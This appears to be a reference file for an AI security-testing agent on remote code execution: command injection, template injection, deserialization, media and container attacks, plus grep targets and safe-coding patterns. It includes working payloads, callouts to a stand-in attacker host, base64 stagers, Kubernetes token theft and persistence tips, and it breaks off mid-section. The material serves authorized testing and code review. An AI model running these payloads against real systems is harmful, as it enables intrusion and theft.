---
name: rce
description: RCE testing covering command injection, deserialization, template injection, and code evaluation
---

# RCE

Remote code execution delivers full server control when untrusted input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media processing pipelines, and build or runtime tooling. Prioritize quiet, portable oracles and advance to stable shell access only when the engagement requires it.

## Where to Look

**Command Execution**
- OS command execution through wrappers, system utilities, and CLI invocations

**Dynamic Evaluation**
- Template engines, expression languages, eval/vm constructs

**Deserialization**
- Unsafe deserialization and gadget chains across language ecosystems

**Media Pipelines**
- ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg

**SSRF Chains**
- Internal services exposing execution primitives such as FastCGI and Redis

**Container Escalation**
- Application-level RCE chained to node or cluster compromise via Docker/Kubernetes misconfigurations

## How to Detect

### Time-Based

**Unix**
- `;sleep 1`, `` `sleep 1` ``, `|| sleep 1`
- Gate delays with short subcommands to lower ambient noise

**Windows**
- CMD: `& timeout /t 2 &`, `ping -n 2 127.0.0.1`
- PowerShell: `Start-Sleep -s 2`

### OAST

**DNS**
```bash
nslookup $(whoami).x.attacker.tld
```

**HTTP**
```bash
curl https://attacker.tld/$(hostname)
```

### Output-Based

**Direct**
```bash
;id;uname -a;whoami
```

**Encoded**
```bash
;(id;hostname)|base64
```

## Vulnerability Patterns

### Command Injection

**Delimiters and Operators**
- Unix: `; | || & && `cmd` $(cmd) $() ${IFS}` newline/tab
- Windows: `& | || ^`

**Argument Injection**
- Inject flags or filenames into CLI arguments (e.g., `--output=/tmp/x`, `--config=`)
- Escape quoted segments by alternating quote styles and escape characters
- Environment expansion: `$PATH`, `${HOME}`, command substitution
- Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`

**Path and Builtin Confusion**
- Force absolute paths (`/usr/bin/id`) rather than relying on PATH resolution
- Substitute alternative tools (`printf`, `getent`) when `id` is filtered
- Leverage `sh -c` or `cmd /c` wrappers to reach the underlying shell

**Evasion**
- Whitespace/IFS: `${IFS}`, `$'\t'`, `<`
- Token splitting: `w'h'o'a'm'i`, `w"h"o"a"m"i`
- Variable construction: `a=i;b=d; $a$b`
- Base64 stagers: `echo payload | base64 -d | sh`
- PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`

### VCS clone/fetch argument & config injection (git, hg, svn)

When a user-controlled repository URL, ref, branch, or "import" string flows into a VCS command, two distinct bugs appear — **argument injection** (the value starts with `-`/`--` and is parsed as an option) and **config injection** (a crafted URL injects extra `git config` keys). Both are RCE/SSRF/file-read sinks even when there is no shell metacharacter, because the danger is in git's own option/config surface, not the shell.

- **RCE via config/option keys:**
  - `core.fsmonitor` / `core.sshCommand` / `core.pager` / `core.editor` set to a command → executed by subsequent git operations
  - `protocol.ext.allow=always` + an `ext::sh -c <cmd>` remote → arbitrary command
  - `--upload-pack=<cmd>` / `-u <cmd>` injected into `git clone`/`git fetch`/`ls-remote`
  - submodule URLs beginning with `-` or `ext::` during recursive clone
- **SSRF via config keys:** a URL crafted so the value lands as `http.proxy=http://internal:port` (e.g. the app builds `-c http.<url>.extraHeader=...` from the raw URL) routes git's HTTP through an attacker-chosen proxy → internal network access. See `ssrf.md`.
- **Local file read / scheme abuse:** `file://`, `ext::`, `--upload-pack=cat` style.

**SAST signal:** user input concatenated into `git clone|fetch|ls-remote|remote add|submodule`, `hg clone`, `svn checkout` argv (Go `exec.Command("git", ..., url)`, Node `simple-git`/`child_process`, Python `subprocess([...])`, Ruby backticks), or passed to a `-c key=value` / `--config` builder where the key portion is influenced by the URL. **SAFE:** validate scheme+host allowlist; reject values starting with `-` (or insert `--` end-of-options before user args); never derive a `git config` key from a user URL; set `protocol.ext.allow=never`, `GIT_PROTOCOL_FROM_USER=0`, and `-c http.followRedirects=false` explicitly.

### Template Injection

Identify the server-side template engine in use: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug

**Minimal Probes**
```
Jinja2: {{7*7}} → {{cycler.__init__.__globals__['os'].popen('id').read()}}
Twig: {{7*7}} → {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: ${7*7} → <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
EJS: <%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Deserialization and EL

**Java**
- Gadget chains via CommonsCollections/BeanUtils/Spring
- Tools: ysoserial
- JNDI/LDAP chains (Log4Shell-style) when lookup paths are reachable

**.NET**
- BinaryFormatter/DataContractSerializer
- APIs accepting untrusted ViewState without MAC validation

**PHP**
- `unserialize()` and PHAR metadata deserialization
- Autoloaded gadget chains in frameworks and plugins

**Python/Ruby**
- pickle, `yaml.load`/`unsafe_load`, Marshal — Ruby `Marshal.load`/`Marshal.restore(var)`, Psych `YAML.load(var)` / `YAML.unsafe_load(var)` without `permitted_classes:` (`YAML.safe_load` is the safe form), `Oj.load(var)` in compat/object mode
- Automatic deserialization in message queues and cache layers

**Expression Languages**
- OGNL/SpEL/MVEL/EL expressions reaching Runtime/ProcessBuilder/exec

**Struts2 OGNL Version Boundaries (fast mode criteria)**
- Only report as high-confidence when BOTH of the following conditions are met:
  - `pom.xml` contains `org.apache.struts:struts2-core` at a version in the high-risk range (e.g., 2.3.x or <= 2.5.33)
  - The project contains reachable Struts action evidence (e.g., `struts.xml` with `<action>` mappings, `extends ActionSupport`, `implements Action`, `@Action(...)`)
- The following evidence is NOT sufficient on its own to confirm action reachability:
  - A Struts filter declaration in `web.xml` alone
  - Log configuration, package name references, or ordinary imports of `org.apache.struts2` / `com.opensymphony.xwork2`
- When only version evidence exists without reachable action evidence, classify as suspicious only — do not report as a high-confidence true positive

### Media and Document Pipelines

**ImageMagick/GraphicsMagick**
- policy.xml may restrict delegates; legacy vectors should still be tested
```
push graphic-context
fill 'url(https://x.tld/a"|id>/tmp/o")'
pop graphic-context
```

**Ghostscript**
- PostScript embedded in PDFs/PS files: `%pipe%id` and file operators

**ExifTool**
- Crafted metadata that invokes external tools or triggers library-level bugs

**LaTeX** (user input compiled to PDF: invoice/resume/certificate/report generators, formula/markdown editors)
- **RCE**: `\write18{cmd}` / `\immediate\write18{cmd}` when compiled with `--shell-escape` (or `\ShellEscape`); pandoc filter chains
- **Arbitrary file read** (works even without shell-escape): `\input{/etc/passwd}`, `\include{file}`, `\lstinputlisting{/etc/passwd}`, or `\newread\f\openin\f=/etc/passwd \read\f to\line` — content is typeset into the output PDF
- **SAST signal**: user-controlled string concatenated into a `.tex` document then handed to `pdflatex`/`xelatex`/`lualatex`/`tectonic` (or libs `node-latex`, `pylatex`, `latexmk`); look for `-shell-escape`/`--shell-escape`/`shell_escape=t` and the absence of `-no-shell-escape` or a restricted/`openin_any=p`/`openout_any=p` `texmf.cnf`
- **SAFE**: compile with `-no-shell-escape` in a sandbox/container with no network and a read-only minimal FS; escape LaTeX special chars (`\ { } $ & # ^ _ ~ %`) and reject `\input`/`\include`/`\write`/`\open*`/`\csname` in user fields; prefer a non-`\write18` engine build

**ffmpeg**
- concat/protocol tricks gated by compile-time flag configuration

**Markup / markdown renderer option injection**
- Some renderers let the *document content* set renderer **options**, which then select a class, formatter, template, or include path — turning "render untrusted markup" into class instantiation / file read / RCE:
  - Kramdown inline `{::options /}` → `syntax_highlighter_opts` → Rouge `formatter` → `Rouge::Formatters.const_get(<attacker class>)` (arbitrary constant load → gadget)
  - Kramdown `template=` option / RDoc `.rdoc_options` / AsciiDoc attributes (`{include::}`, backend/template) / reStructuredText `..raw::`/`..include::` directives
- **SAST signal:** untrusted content (wiki pages, README/issue/comment bodies, uploaded `.md`/`.rmd`/`.adoc`/`.rst`) passed to a markup renderer **without disabling inline-options / unsafe directives / template selection**. Look for `Kramdown::Document.new(content)`, `GitHub::Markup.render`, `RDoc::Options`, Asciidoctor `safe: :unsafe`/`:server` instead of `:secure`, docutils with `file_insertion_enabled`/`raw_enabled` on.
- **SAFE:** render in the most restricted safe mode (Asciidoctor `safe: :secure`, docutils `file_insertion_enabled=false`, `raw_enabled=false`), strip/forbid inline option blocks, pin the highlighter/formatter server-side, never let document content choose a class/template/include path.

### SSRF to RCE

**FastCGI**
- `gopher://` to php-fpm (construct FPM records to invoke system/exec)

**Redis**
- `gopher://` to write cron jobs or authorized_keys to webroot
- Module load when the server permits it

**Admin Interfaces**
- Jenkins script console, Spark UI, Jupyter kernels reachable from internal network

### Container and Kubernetes

**Docker**
- From application RCE, inspect `/.dockerenv`, `/proc/1/cgroup`
- Enumerate mounts and capabilities: `capsh --print`
- Abuse paths: mounted docker.sock, hostPath mounts, privileged containers
- Write to `/proc/sys/kernel/core_pattern` or mount the host filesystem with `--privileged`

**Kubernetes**
- Steal service account token from `/var/run/secrets/kubernetes.io/serviceaccount`
- Query API server for pods and secrets; enumerate RBAC permissions
- Communicate with kubelet on 10250/10255; exec into adjacent pods
- Escalate via privileged pods, hostPath volume mounts, or daemonsets

## Evasion Patterns

**Encoding Differentials**
- URL encoding, Unicode normalization, comment insertion, mixed case
- Request smuggling to route payloads through alternate parsers

**Binary Alternatives**
- Absolute paths and alternative binaries (busybox, sh, env)
- Windows variations across PowerShell and CMD
- Constrained-language mode bypasses

## Post-Exploitation

**Privilege Escalation**
- `sudo -l`; SUID binaries; capability enumeration (`getcap -r / 2>/dev/null`)

**Persistence**
- cron/systemd/user services; web shell deployed behind authentication
- Plugin hooks; supply-chain insertion into CI/CD pipelines

**Lateral Movement**
- SSH keys, cloud metadata service credentials, internal service tokens

## Analysis Workflow

1. **Identify sinks** — Command wrappers, template rendering, deserialization entry points, file converters, report generators, plugin hooks
2. **Establish oracle** — Timing delays, DNS/HTTP callbacks, or deterministic output diffs (length/ETag)
3. **Confirm context** — Current user, working directory, PATH, shell, SELinux/AppArmor status, containerization
4. **Map boundaries** — Readable/writable file paths, outbound egress routes
5. **Progress to control** — File write, scheduled execution, service restart hooks

## Recon Indicators (Dangerous Sinks)

Flag sinks where a non-constant variable appears in a dangerous position. Phase-2 taint analysis determines exploitability.

**OS command execution**

| Language | Grep targets |
|----------|--------------|
| Python | `os.system(`, `os.popen(`, `subprocess.*shell=True`, string-form `subprocess.run(` / `Popen(` with variables, legacy `commands.getoutput(` / `commands.getstatusoutput(` (py2), `pty.spawn(` / `os.execv*(` with built input |
| Node.js | `child_process.exec(`, `execSync(`, `spawn(.*shell:\s*true`, `shelljs.exec(`, `execa(var)` / `` execa`...${var}` ``, `execFile(`/`spawn(` where the **command path** (1st arg) is variable |
| PHP | `exec(`, `system(`, `passthru(`, `shell_exec(`, `popen(`, `proc_open(`, `pcntl_exec(`, `` ` `` backticks with `{$` or concatenation |
| Ruby | `system("` with `#{}`, backticks, `%x{`, `IO.popen(`, `Open3.popen3(` |
| Java | `Runtime.getRuntime().exec(`, `ProcessBuilder(` with variable args or `"sh", "-c"` |
| Go | `exec.Command(` where command name or args are built from external input |
| C# | `Process.Start(`, `ProcessStartInfo` with variable `FileName`/`Arguments` |
| C/C++ | `system(`, `popen(`, the `exec*` family (`execl`/`execlp`/`execle`/`execv`/`execvp`/`execvpe`), `posix_spawn(` where the command string/arg is built from input (e.g. `strcat`/`sprintf`/`snprintf` into a command buffer). Safe: fixed program path with separate, non-shell args |
| Rust | `std::process::Command::new(prog)` / `.arg(`/`.args(` where the program name or an argument is built from input; especially `Command::new("sh").arg("-c").arg(tainted)`. Safe: fixed program path with separate, non-shell args |

**Code evaluation**

| Language | Grep targets |
|----------|--------------|
| Python | `eval(`, `exec(`, `compile(` + exec, `importlib.import_module(`, `__import__(`, `code.InteractiveConsole(`/`InteractiveInterpreter(` (`.push`/`.runsource`/`.runcode`), `logging.config.listen(` (eval-over-socket config server), `_xxsubinterpreters.run_string(`, `_testcapi.run_in_subinterp(` / `test.support.run_in_subinterp(` |
| JavaScript | `eval(`, `new Function(`, `setTimeout(.*\+`, `vm.runInNewContext(`/`runInContext(`/`runInThisContext(`/`compileFunction(`, dynamic `require(`; sandbox libs that **do not** isolate untrusted code — `vm2` `new VM().run(`/`new NodeVM().run(`/`new VMScript(`, `sandbox` pkg `.run(`, and eval wrappers `notevil(`/`safe-eval`/`static-eval` (all bypassable → treat as `eval`). `isolated-vm` is safer but still RCE if the host bridges callbacks to untrusted code |
| PHP | `eval(`, `preg_replace.*/e`, `mb_ereg_replace(.*'e'`, `assert(`, `create_function(`, `call_user_func(`/`call_user_func_array(` with tainted callable, `new $var(` |
| Ruby | `eval(`, `instance_eval(`, `class_eval(`, `module_eval(`, `binding.eval(`, `Open3.pipeline(`/`pipeline_r(`/`pipeline_rw(`/`pipeline_w(`/`pipeline_start(` with built commands |
| Go | embedded JS/script VMs run with tainted source — `otto` `vm.Run(`/`vm.Eval(`, `goja` `vm.RunString(`, `tengo`/`gopher-lua` `DoString(` |

**Headless-browser / PDF-render code injection** — passing attacker-influenced script or HTML to a browser-automation or HTML-to-PDF engine executes arbitrary JS in the render context (and frequently reaches the local filesystem / internal network → also SSRF/LFI). Flag tainted input reaching: Puppeteer/Playwright `page.evaluate(`/`evaluateHandle(`/`evaluateOnNewDocument(`/`addInitScript(`/`page.setContent(`/`page.$eval(`; Chrome DevTools Protocol `Runtime.evaluate`/`Runtime.compileScript`/`Page.navigate`/`Page.setDocumentContent`; PhantomJS `page.evaluate`/`page.open`; `wkhtmltopdf`/`wkhtmltoimage` `.generate(` with user HTML; Deno `Deno.run(`/`new Deno.Command(`. **SAFE**: pass untrusted data as serialized **arguments** to `page.evaluate(fn, arg)` (never string-concatenate into the function body), render only server-controlled templates, disable JS in the PDF engine when not needed.

**Unsafe deserialization** — flag all usages; confirm external data flow separately. See [insecure_deserialization.md](insecure_deserialization.md).

**Untrusted runtime / image execution** — a user-controlled value selecting *what* to execute is RCE-equivalent even without a shell metacharacter.

| Language | Grep targets |
|----------|--------------|
| Python | `docker.from_env()` then `containers.run(`/`containers.create(` with a variable image; `subprocess`/`os.exec*` with a variable program name |
| Any | container/orchestration SDK calls (`run`, `create`, `exec`) where the image, command, or entrypoint is built from external input |

**Skip (safe)** — list-form subprocess/spawn without shell; `json.loads`/`JSON.parse`; `yaml.safe_load`; `ast.literal_eval`; container `run(...)` with a hardcoded image and arguments.

**Source param-name hints (prioritization only — never a standalone finding).** Request params whose *name* suggests the value may flow into a command/arg/program-name position — high-priority to trace into the OS-command sinks above. A name match is a prioritization signal only; flag command injection / RCE only when the value reaches a dangerous sink. Match case-insensitively, tokenizing compounds: `cmd`, `command`, `exec`, `execute`, `run`, `cli`, `arg`, `args`, `option`, `flag`, `daemon`, `host`, `hostname`, `ip`, `domain`, `ping`, `nslookup`, `dir`, `path`, `file`, `filename`, `download`, `upload`, `url`, `log`, `name`, `process`, `task`, `job`, `script`, `program`, `binary`, `format` (ffmpeg/imagemagick converters), `image` (container image selectors).

## Safe Patterns

When these patterns are present and complete, command-injection risk is typically eliminated:

**Argument-vector exec (no shell)**

```python
subprocess.run(["convert", "-resize", size, infile, outfile])  # no shell=True
```

```javascript
child_process.spawn("ffmpeg", ["-i", inputFile, outputFile]);
```

```java
new ProcessBuilder("ls", "-la", dir).start();
```

```ruby
system("ffmpeg", "-i", "input.mp4", "-f", format, "output")  # separate args, not interpolated string
```

**Strict allowlist before use**

```python
ALLOWED_FORMATS = {"png", "jpg", "webp"}
if fmt not in ALLOWED_FORMATS:
    return abort(400)
subprocess.run(["convert", infile, f"output.{fmt}"])
```

**Safe expression parsing (Python)**

```python
from ast import literal_eval
result = literal_eval(user_data)  # literals only — not eval()
```

**Safe deserialization** — prefer JSON or safe loaders; see [insecure_deserialization.md](insecure_deserialization.md).

## Confirming a Finding

1. Deliver a minimal, reproducible oracle (DNS/HTTP/timing) demonstrating controlled code execution
2. Show command context — uid, gid, cwd, environment — alongside controlled output
3. Demonstrate persistence or file write within application constraints
4. If containerized, document boundary crossing attempts (host files, Kubernetes APIs) and whether they succeed
5. Keep PoCs minimal and reproducible across multiple runs and transport variants

**Dynamic test (from static sink)**

For command injection sinks, confirm with a delimiter payload and look for command output or timing:

```bash
# Direct output oracle
curl "https://app.example.com/ping?host=127.0.0.1;id"
curl "https://app.example.com/ping?host=127.0.0.1%3Bid"   # URL-encoded ;

# Timing oracle (when output is suppressed)
curl "https://app.example.com/ping?host=127.0.0.1;sleep+3"
```

For `eval`/expression sinks, inject a side-effect oracle (`process.exit()`, `__import__('os').system('id')`) and observe response change or OAST callback. For deserialization findings, craft format-specific payloads per [insecure_deserialization.md](insecure_deserialization.md).

## Common False Alarms

- Crashes or timeouts without any attacker-controlled behavioral outcome
- Filtered execution where only a constrained command subset runs without attacker-controlled arguments
- Sandboxed interpreters running in a restricted VM that prohibits IO and process spawning
- Simulated outputs not derived from actual executed commands

## Business Risk

- Remote system control under the application user account; potential privilege escalation to root
- Data theft, encryption and signing key compromise, supply-chain insertion, and lateral movement
- Cluster-wide compromise when chained with container or Kubernetes misconfigurations

## Analyst Notes

1. Prefer OAST oracles; avoid long sleeps — short gated delays minimize noise
2. When command injection produces only weak results, pivot to file write, deserialization, or SSTI paths
3. Treat converters and document renderers as first-class sinks; many run out-of-process with privileged delegates
4. For Java and .NET, enumerate classpath assemblies against known gadget libraries; confirm with out-of-band payloads
5. Always verify the execution environment: PATH, shell, umask, SELinux/AppArmor enforcement, container capabilities
6. Keep payloads portable across POSIX/BusyBox/PowerShell and minimize external dependencies
7. Document the smallest exploit chain that proves durable impact; avoid unnecessary shell drops

## Core Principle

RCE is a property of the execution boundary. Locate the sink, establish a quiet oracle, and advance toward durable control only as far as the engagement requires. Validate across transport variants and execution environments, since defenses frequently differ per code path.

## Distinguishing Command Injection from Generic RCE

Command injection and RCE are related but distinct vulnerability classes. Using the precise label improves triage accuracy and remediation guidance.

### What RCE Is

- User input reaching OS command execution with shell interpretation enabled (`shell=True`, string-form `system`/`exec`, `sh -c` wrappers)
- `eval()`, `exec()`, `Function()`, or equivalent interpreting user-controlled strings as code
- Dynamic `require()`/`import()` or `importlib.import_module()` with user-controlled module paths
- PHP file inclusion (`include`/`require`) with user-controlled paths
- `yaml.load()` without a safe loader on user-supplied content
- Unsafe deserialization of attacker-controlled bytes — see [insecure_deserialization.md](insecure_deserialization.md) (pickle, PHP `unserialize`, Java native serialization, Ruby Marshal, etc.)

### What RCE Is Not

Do not flag these as RCE:

- **SSRF** — HTTP requests to attacker URLs; no direct code execution
- **Path traversal** — arbitrary file read/write unless the file is then executed or deserialized
- **SSTI** — template engine injection; classify as SSTI, not RCE (even when it leads to code execution)
- **XSS** — client-side JavaScript in a victim browser
- **SQL injection** — database query injection (even when `xp_cmdshell` chains to OS commands)
- **Safe subprocess list-form** — `subprocess.run(["ls", user_arg])` with no `shell=True`; args pass to the OS without shell expansion
- **Safe deserialization formats** — `json.loads()`, `yaml.safe_load()`, `JSON.parse()`; no code execution semantics

### Command Injection (OS Command Injection)
The attacker's input reaches an **OS shell or process execution sink** and is interpreted as part of a shell command:

**Sinks that indicate command injection:**
- Python: `os.system()`, `os.popen()`, `subprocess.Popen(shell=True)`, `subprocess.run(shell=True)`, `subprocess.call(shell=True)`
- PHP: `exec()`, `system()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, `pcntl_exec()`, backtick operator
- Node.js: `child_process.exec()`, `child_process.execSync()`
- Java: `Runtime.getRuntime().exec()`, `ProcessBuilder` with user args
- Ruby: `system()`, backticks, `%x{}`, `IO.popen()`, `Open3.capture3()`
- Go: `exec.Command()` with user-built command or `sh -c` wrapper
- C#: `Process.Start()`, `ProcessStartInfo` with variable `FileName`/`Arguments`

**Key characteristic**: the user input is concatenated into a **shell command string** or passed as **arguments to an OS process**. The exploit uses shell metacharacters (`;`, `|`, `&&`, `$()`, backticks) to inject additional commands.

### Generic RCE
Use RCE only when the execution primitive is **NOT an OS command shell** but rather a language-level code evaluation or injection mechanism:
- `eval()` / `exec()` (Python/JS/PHP code evaluation, not OS commands)
- Template injection leading to code execution (SSTI → RCE)
- Deserialization chains leading to arbitrary code execution
- Expression language injection (SpEL, OGNL, MVEL)
- ScriptEngine / Groovy shell / dynamic class loading

### Decision Rule
1. Does user input reach `system()`, `exec()` (shell), `popen()`, `subprocess(shell=True)`, `Runtime.exec()`, or equivalent OS command API? → **command injection**
2. Does user input reach `eval()`, `exec()` (code), template engine, deserializer, or expression parser? → **RCE** (or the more specific sub-class like SSTI, insecure deserialization)
3. CVE-based exploits (e.g., WordPress plugin RCE, Struts OGNL) where the exploit chain ultimately calls OS commands → **command injection** if the final sink is a shell command; otherwise **RCE**
4. When both exist (e.g., `eval()` that constructs and runs a shell command), prefer **command injection** if the attacker's primary control is over the OS command

### Common Misclassification Patterns
- Apache Struts OGNL injection with `Runtime.exec()` in the gadget chain → the primary vulnerability is command injection via OGNL, classify as **command injection**
- WordPress plugin vulnerabilities that lead to shell command execution → **command injection**
- `subprocess.Popen(f"curl {url}", shell=True)` → **command injection**, not SSRF (even though curl is involved, the shell interpretation is the vulnerability)
- PHP `system("convert " . $userInput)` → **command injection**
- Flask `eval(request.args.get('expr'))` → **RCE** (Python code evaluation, not shell)

## Java Source Detection Rules

### TRUE POSITIVE: Runtime.exec with user-controlled input (CWE-78)
- `Runtime.getRuntime().exec(userInput)` or `Runtime.getRuntime().exec(new String[]{..., userInput, ...})` where `userInput` comes from `@RequestParam`, `@PathVariable`, or request body = CONFIRM.
- `ProcessBuilder` with user-controlled args = CONFIRM.
- Even if the input is labeled as a "command" parameter in a demo app, the vulnerability is real.

### TRUE POSITIVE: SpEL expression injection (CWE-94/CWE-78)
- `ExpressionParser.parseExpression(userInput).getValue(...)` where `userInput` is HTTP request data = CONFIRM.
- Spring SPEL evaluation with user-controlled expression string = RCE.

### FALSE POSITIVE
- `Runtime.exec(...)` with a fully static/hardcoded command array (no user input in any element).
- Command execution inside a restricted sandbox where the application has no process spawn capability.

## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `os.system(user_input)`, `os.popen(user_input)`
- **VULN**: `subprocess.run(user_input, shell=True)` — shell=True with controllable input
- **VULN**: `subprocess.Popen(f"cmd {user_input}", shell=True)`
- **VULN**: `eval(user_input)`, `exec(user_input)`
- **SAFE**: `subprocess.run(["ls", user_input], shell=False)` — list form, no shell injection
- **KEY**: `shell=True` + any user input = HIGH RISK

```python
# VULN: eval with user input
result = eval(request.args.get('expr'))  # __import__('os').system('id')

# SECURE: ast.literal_eval for literals only
from ast import literal_eval
result = literal_eval(request.args.get('data'))
```

### JavaScript (Node.js)
- **VULN**: `child_process.exec(userInput, callback)` — shell interprets the string
- **VULN**: `child_process.execSync(userInput)`
- **VULN**: `eval(req.body.code)`, `new Function(req.body.code)()`
- **SAFE**: `child_process.execFile('/bin/ls', [userInput])` — no shell spawned
- **SAFE**: `child_process.spawn('ls', [userInput])` — array args, no shell

### PHP
- **VULN**: `exec($userInput)`, `system($userInput)`, `passthru($userInput)`
- **VULN**: `` `$userInput` `` — backtick operator executes shell command
- **VULN**: `shell_exec($userInput)`, `proc_open($userInput, ...)`
- **PARTIAL** (not a complete fix): `escapeshellarg()` + `escapeshellcmd()` wrapping reduces risk but is unreliable (the two interact badly and still allow argument/option injection); prefer avoiding the shell entirely (`proc_open` with an arg array)

### PHP — Command Injection Examples

```php
// VULNERABLE: shell_exec with interpolated user input
function generateThumbnail($file) {
    $size = $_GET['size'];
    shell_exec("convert {$file} -resize {$size} thumb.jpg");
}

// VULNERABLE: backtick operator
$result = `ping -c 1 $host`;

// PARTIAL: escapeshellarg reduces but does not eliminate risk — prefer no shell
$size = escapeshellarg($_GET['size']);
shell_exec("convert $file -resize $size thumb.jpg");
```

### Ruby — Command Injection Examples

```ruby
# VULNERABLE: string interpolation in system()
get '/convert' do
  format = params[:format]
  system("ffmpeg -i input.mp4 -f #{format} output")
end

# VULNERABLE: backtick with user input
def check_dns
  `nslookup #{params[:host]}`
end

# SECURE: separate args + allowlist
get '/convert' do
  format = params[:format]
  ALLOWED = %w[mp4 avi mkv]
  return 400 unless ALLOWED.include?(format)
  system("ffmpeg", "-i", "input.mp4", "-f", format, "output")
end
```

### Go — Command Injection Examples

```go
// VULNERABLE: user input in command string passed to sh -c
cmd := exec.Command("sh", "-c", "ping -c 1 "+host)

// VULNERABLE: user controls binary name or args from unsplit external input
cmd := exec.Command(userCmd, userArgs...)

// SECURE: fixed binary, user value as discrete arg (verify no flag injection)
cmd := exec.Command("ping", "-c", "1", host)
```

### C# — Command Injection Examples

```csharp
// VULNERABLE: user input in Arguments string (shell interpretation)
var psi = new ProcessStartInfo {
    FileName = "cmd.exe",
    Arguments = "/c ping " + userHost
};
Process.Start(psi);

// SECURE: fixed FileName, user value as separate argument (no shell)
var psi = new ProcessStartInfo {
    FileName = "ping",
    ArgumentList = { "-c", "1", userHost }
};
Process.Start(psi);
```

## Java Servlet Patterns — Command Injection (CWE-78)

**VULN** — tainted input reaches shell execution:
```java
Runtime.getRuntime().exec(new String[]{"sh", "-c", tainted})
Runtime.getRuntime().exec("cmd " + tainted)
new ProcessBuilder("sh", "-c", tainted).start()
```

**SAFE** — fixed commands only, no tainted data in command string:
```java
new ProcessBuilder("ls", "-la", fixedPath).start()  // SAFE if no tainted data
```

**Decision rule**: tainted data embedded in the shell command string or passed to `exec(String)` (single-string form) → **VULN**.

**Edge cases**:
- `Runtime.exec(cmd, env)` and `Runtime.exec(args, env, cwd)` are **VULN** when any element of the args/env array is tainted.
- Array-form execution is still **VULN** when any element is tainted: `new String[]{"sh", "-c", cmd + bar}`.
- Constant-fold obvious arithmetic or switch branches — if they force a fixed literal into the command → **SAFE**.
- If a helper method is called with a fixed literal and returns from that fixed-literal path, do not preserve taint from discarded temporaries → **SAFE**.

## Log4j2 Interpolation as RCE Source (Log4Shell)

```java
// VULNERABLE: Log4j2 < 2.15.0 logging user-controlled data
// The vulnerability is in WHAT gets logged — any user-controlled string containing
// ${jndi:ldap://...} triggers a JNDI lookup at log time

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

Logger logger = LogManager.getLogger();

// ALL of these are VULNERABLE if log4j-core < 2.15.0:
logger.info("User login: {}", request.getParameter("username"));
logger.error("Auth failed for: " + request.getHeader("X-Forwarded-For"));
logger.warn("Request from: {}", request.getHeader("User-Agent"));
logger.debug("Processing: {}", request.getRequestURI());
```

**VULN condition** (all three must hold):
1. `log4j-core` version < 2.15.0 in `pom.xml` / `build.gradle`
2. Logger logs user-controlled value (HTTP header, param, body, URI)
3. No mitigation: `-Dlog4j2.formatMsgNoLookups=true` or `log4j2.xml` with `%msg{nolookups}` pattern

```xml
<!-- pom.xml — vulnerable Log4j2 versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- CVE-2021-44228: CRITICAL -->
</dependency>
```

**Safe versions**: log4j-core >= 2.17.1 (Java 11+), >= 2.12.4 (Java 8), >= 2.3.2 (Java 7) — all known RCE variants fixed

## Node.js child_process Patterns

```js
// VULNERABLE: exec() with user-controlled string (shell interprets special chars)
const { exec, execSync } = require('child_process');

app.get('/ping', (req, res) => {
    exec(`ping -c 1 ${req.query.host}`, (err, stdout) => {
        res.send(stdout);
    });
    // Attacker: host=127.0.0.1;id  → command injection
});

// VULNERABLE: template literal in exec
app.post('/convert', (req, res) => {
    execSync(`convert ${req.body.inputFile} ${req.body.outputFile}`);
    // Both arguments shell-interpreted — injection via ; | && etc.
});

// VULNERABLE: spawnSync invoking bash -c with tainted input (shell interpretation)
const { spawnSync } = require('child_process');
spawnSync('bash', ['-c', req.query.cmd], { shell: true });

// SAFE: spawn with array args (no shell invocation)
const { spawn } = require('child_process');
spawn('ping', ['-c', '1', req.query.host]);   // array form, shell NOT invoked — SAFE
// But: verify req.query.host doesn't contain flag injection (--foo)
```

**Key distinction**:
- `exec(string)` → shell parses the entire string → **VULN** with any user input
- `spawn(cmd, [args])` → no shell, args passed directly → **SAFE** (unless cmd itself is user-controlled)
- `spawn(cmd, args, {shell: true})` → shell invoked → **VULN**

## Java EL/SpEL/OGNL Explicit Sink Detection

```java
// VULNERABLE: SpEL with StandardEvaluationContext (full power — T() type access)
ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression(request.getParameter("query"));
Object result = expr.getValue(new StandardEvaluationContext());
// Attacker: query=T(java.lang.Runtime).getRuntime().exec('id')  → RCE

// VULNERABLE: OGNL evaluation with user input
Object value = Ognl.getValue(request.getParameter("expr"), context, root);

// VULNERABLE: MVEL
Object result = MVEL.eval(request.getParameter("expression"), vars);

// VULNERABLE: Groovy ScriptEngine
ScriptEngine engine = new ScriptEngineManager().getEngineByName("groovy");
engine.eval(request.getParameter("script"));

// VULNERABLE: BeanShell (bsh.Interpreter)
Interpreter interpreter = new Interpreter();
interpreter.eval(request.getParameter("bsh"));

// SAFE: SpEL with SimpleEvaluationContext — no type access, no method invocations
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
parser.parseExpression(userInput).getValue(ctx);
```

## Groovy Script Injection via ScriptEngineManager

```java
// VULNERABLE: any JSR-223 script engine with user input
ScriptEngine engine = new ScriptEngineManager().getEngineByName("groovy");  // or "js", "ruby"
engine.eval(request.getParameter("script"));
// ScriptEngine gives full language access → RCE

// VULNERABLE: Scripting API used in report/template generation
ScriptEngine nashorn = new ScriptEngineManager().getEngineByName("nashorn");
nashorn.eval(request.getParameter("filter"));   // Nashorn (Java's JS engine) = full RCE
// Note: Nashorn deprecated in Java 11+, GraalVM Polyglot API used instead

// VULNERABLE: GraalVM Polyglot
Context polyContext = Context.newBuilder("js").build();
polyContext.eval("js", request.getParameter("code"));  // full JS execution = RCE
```

## H2 Console / CREATE ALIAS Code Execution

```java
// VULNERABLE: H2 in-memory DB with user-controlled SQL, allowing DDL
